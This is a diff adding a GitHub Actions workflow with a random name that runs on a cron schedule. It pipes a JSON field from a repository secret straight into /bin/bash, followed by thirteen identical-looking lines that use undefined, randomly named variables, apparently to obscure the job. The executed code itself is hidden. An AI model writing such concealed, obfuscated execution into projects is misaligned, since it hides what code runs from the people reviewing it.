@@ -1,0 +1,29 @@
+name: tianzhanzhenhuatong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianzhanzhenhuatong
+        env:
+          zab00: ${{ secrets.zab00 }}
+        run: |
+          echo $zab00 | jq -r .rljl285 | /bin/bash
+          echo $kolrc51 | jq -r .voz04504 | /bin/bash
+          echo $c73 | jq -r .hfx61 | /bin/bash
+          echo $y86 | jq -r .f407 | /bin/bash
+          echo $l96 | jq -r .aykvu0156 | /bin/bash
+          echo $wtgv1307 | jq -r .nc5276 | /bin/bash
+          echo $ymge90 | jq -r .krmxy555 | /bin/bash
+          echo $yplm63119 | jq -r .in21984 | /bin/bash
+          echo $rnd774 | jq -r .zmh62877 | /bin/bash
+          echo $xeep7351 | jq -r .utra64386 | /bin/bash
+          echo $z5 | jq -r .sa874 | /bin/bash
+          echo $bj47 | jq -r .zqrvk36871 | /bin/bash
+          echo $i56253 | jq -r .cps0700 | /bin/bash
+          echo $kxkia92 | jq -r .h923 | /bin/bash
+
